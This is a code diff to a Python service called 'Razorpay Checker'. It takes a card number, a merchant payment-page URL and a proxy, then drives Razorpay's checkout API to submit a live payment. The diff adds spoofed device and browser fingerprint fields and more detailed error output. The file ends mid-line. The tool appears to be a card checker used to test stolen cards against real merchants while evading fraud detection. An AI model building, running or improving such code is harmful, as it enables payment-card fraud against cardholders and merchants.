@@ -3,6 +3,7 @@
 """
 Razorpay Checker — Fast · Accurate · Reliable.
 Async Playwright. Runs inside Microsoft's Playwright base image.
+Includes raw response debug output for payment-submit failures.
 """
 
 import os
@@ -183,6 +184,7 @@ async def run_check_async(site_url, cc, proxy_cfg):
     page.set_default_timeout(40000)
 
     try:
+        # --- 1. merchant data
         await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
         merchant = await page.evaluate("""() => {
             const out = {};
@@ -231,6 +233,7 @@ async def run_check_async(site_url, cc, proxy_cfg):
         if amount < 100:
             amount = 100
 
+        # --- 2. session token
         params = {
             "traffic_env": "production",
             "build": BUILD_DEFAULT,
@@ -255,6 +258,7 @@ async def run_check_async(site_url, cc, proxy_cfg):
             return {"ok": False, "response": "session_token not found",
                     "time": round(time.time() - t0, 2)}
 
+        # --- 3. create order
         order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
             try {
                 const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
@@ -279,6 +283,7 @@ async def run_check_async(site_url, cc, proxy_cfg):
         checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
         token_create = build_token_create(checkout_id)
 
+        # --- 4. submit payment
         payload = {
             "notes[comment]": "",
             "notes[email]": email,
@@ -288,6 +293,7 @@ async def run_check_async(site_url, cc, proxy_cfg):
             "notes[pan_number]": pan,
             "payment_link_id": payment_link_id,
             "key_id": key_id,
+            "callback_url": "https://your-server.com/callback",
             "contact": phone,
             "email": email,
             "currency": "INR",
@@ -296,11 +302,18 @@ async def run_check_async(site_url, cc, proxy_cfg):
             "_[checkout_id]": checkout_id,
             "_[device.id]": device_id,
             "_[library]": "checkoutjs",
+            "_[library_src]": "no-src",
+            "_[current_script_src]": "no-src",
             "_[platform]": "browser",
+            "_[env]": "",
+            "_[is_magic_script]": "false",
             "_[os]": "windows",
             "_[referer]": site_url,
             "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
             "_[shield][tz]": "330",
+            "_[shield][os]": "windows",
+            "_[shield][platform]": "browser",
+            "_[shield][browser]": "chrome",
             "_[device_id]": device_id,
             "_[build]": BUILD_DEFAULT,
             "_[request_index]": "1",
@@ -333,11 +346,13 @@ async def run_check_async(site_url, cc, proxy_cfg):
                 });
                 const text = await r.text();
                 let parsed; try { parsed = JSON.parse(text); } catch { parsed = text; }
-                return {status: r.status, body: parsed};
-            } catch (e) { return {status: 0, body: 'NETWORK:' + e.message}; }
+                return {status: r.status, raw: text.slice(0, 800), body: parsed};
+            } catch (e) { return {status: 0, raw: '', body: 'NETWORK:' + e.message}; }
         }""", [payload, key_id, session_token, keyless_header])
 
-        body = result.get("body") if isinstance(result, dict) else result
+        status_code = result.get("status", 0) if isinstance(result, dict) else 0
+        raw_debug   = result.get("raw", "") if isinstance(result, dict) else ""
+        body        = result.get("body") if isinstance(result, dict) else result
         payment_id = None
 
         if isinstance(body, dict):
@@ -391,7 +406,8 @@ async def run_check_async(site_url, cc, proxy_cfg):
             if "error" in body:
                 err = body["error"]
                 desc = err.get("description") or err.get("reason") or str(err)
-                return {"ok": False, "response": str(desc)[:200],
+                return {"ok": False,
+                        "response": f"[HTTP {status_code}] {desc} | raw: {raw_debug[:400]}",
                         "payment_id": payment_id, "order_id": order_id,
                         "time": round(time.time() - t0, 2)}
 
@@ -401,11 +417,13 @@ async def run_check_async(site_url, cc, proxy_cfg):
                         "payment_id": payment_id, "order_id": order_id,
                         "time": round(time.time() - t0, 2)}
 
-            return {"ok": False, "response": json.dumps(body)[:200],
+            return {"ok": False,
+                    "response": f"[HTTP {status_code}] {json.dumps(body)[:300]} | raw: {raw_debug[:300]}",
                     "payment_id": payment_id, "order_id": order_id,
                     "time": round(time.time() - t0, 2)}
 
-        return {"ok": False, "response": str(body)[:200],
+        return {"ok": False,
+                "response": f"[HTTP {status_code}] {str(body)[:200]} | raw: {raw_debug[:300]}",
                 "time": round(time.time() - t0, 2)}
 
     except PWTimeoutError as e:
@@ -469,19 +487,4 @@ def razorpay_route():
         "CC": cc,
         "Response": out.get("response", "unknown"),
         "Status": out.get("ok", False),
-        "PaymentID": out.get("payment_id"),
-        "OrderID": out.get("order_id"),
-        "Site": site,
-        "Time": f"{out.get('time', 0)}s",
-        "Dev": DEV_BASE,
-    })
-
-
-@app.route("/health", methods=["GET"])
-def health():
-    return jsonify({"ok": True, "ts": int(time.time())})
-
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port, threaded=False, debug=False, use_reloader=False)
+        "
